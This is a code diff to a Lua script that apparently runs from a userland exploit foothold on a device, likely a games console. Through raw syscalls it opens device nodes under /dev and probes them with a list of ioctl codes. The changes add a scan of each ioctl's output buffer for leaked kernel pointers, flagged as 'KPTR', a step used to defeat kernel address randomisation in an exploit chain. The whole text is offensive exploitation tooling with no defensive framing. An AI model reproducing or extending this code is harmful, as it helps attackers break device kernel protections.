@@ -54,15 +54,22 @@ local nodes = { "gc", "dce", "gic", "ajmi", "ajm", "camera", "notification0", "u
 local fds = {}
 local function path(p)
     local b = memory.alloc(0x100)
-    pcall(function() memory.write_qword(b, 0) end)
-    for i = 1, #p do
-        local ch = string.byte(p, i)
-        pcall(function() memory.write_byte(b + i - 1, ch) end)
+    for i = 0, 0xFC, 4 do
+        pcall(function() memory.write_dword(b + i, 0) end)
+    end
+    for i = 0, #p - 1, 4 do
+        local d = 0
+        for j = 0, 3 do
+            if i + j < #p then
+                d = d + string.byte(p, i + j + 1) * (256 ^ j)
+            end
+        end
+        pcall(function() memory.write_dword(b + i, d) end)
     end
     return b
 end
 for i = 1, #nodes do
-    local rv = call(5, path("/dev/" .. nodes[i]))
+    local rv = call(5, path("/dev/" .. nodes[i]), uint64(2))  -- O_RDWR
     local fd = n(rv)
     print(string.format("    %-14s open=%s", nodes[i], raw(rv)))
     if fd >= 0 then fds[#fds + 1] = { nodes[i], fd } end
@@ -132,8 +139,8 @@ local codes = {
     0xC1785504
 }
 local buf = memory.alloc(0x800)
-for i = 0, 0x7FF do
-    pcall(function() memory.write_byte(buf + i, 0) end)
+for i = 0, 0x7FC, 4 do
+    pcall(function() memory.write_dword(buf + i, 0) end)
 end
 local sc_ioctl = make_syscall(54)
 sc_ioctl.syscall_no = 54
@@ -141,6 +148,10 @@ local hits, tried = 0, 0
 for fi = 1, #fds do
     local nm, fd = fds[fi][1], fds[fi][2]
     local refused = 0
+    -- re-zero buffer between devices
+    for zi = 0, 0x7FC, 4 do
+        pcall(function() memory.write_dword(buf + zi, 0) end)
+    end
     for ci = 1, #codes do
         local code = codes[ci]
         local ok, rv = pcall(function() return sc_ioctl(uint64(fd), uint64(code), uint64(buf)) end)
@@ -154,6 +165,20 @@ for fi = 1, #fds do
                 local b0 = 0
                 pcall(function() b0 = to_num(memory.read_dword(buf)) end)
                 print(string.format("    HIT %-14s fd=%-3d code=0x%08X ret=%s buf0=0x%08X", nm, fd, code, raw(rv), b0))
+                -- scan buffer for kernel pointers
+                local dir = math.floor(code / 0x20000000) % 4  -- 2=OUT, 3=INOUT
+                local sz = math.floor(code / 0x10000) % 0x2000
+                if dir >= 2 and sz > 0 and sz <= 0x800 then
+                    for off = 0, sz - 8, 4 do
+                        local lo = 0; pcall(function() lo = to_num(memory.read_dword(buf + off)) end)
+                        local hi = 0; pcall(function() hi = to_num(memory.read_dword(buf + off + 4)) end)
+                        if lo < 0 then lo = lo + 0x100000000 end
+                        if hi < 0 then hi = hi + 0x100000000 end
+                        if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
+                            print(string.format("    *** KPTR %s code=0x%08X +0x%X: 0x%08X%08X ***", nm, code, off, hi, lo))
+                        end
+                    end
+                end
             else
                 refused = refused + 1
             end
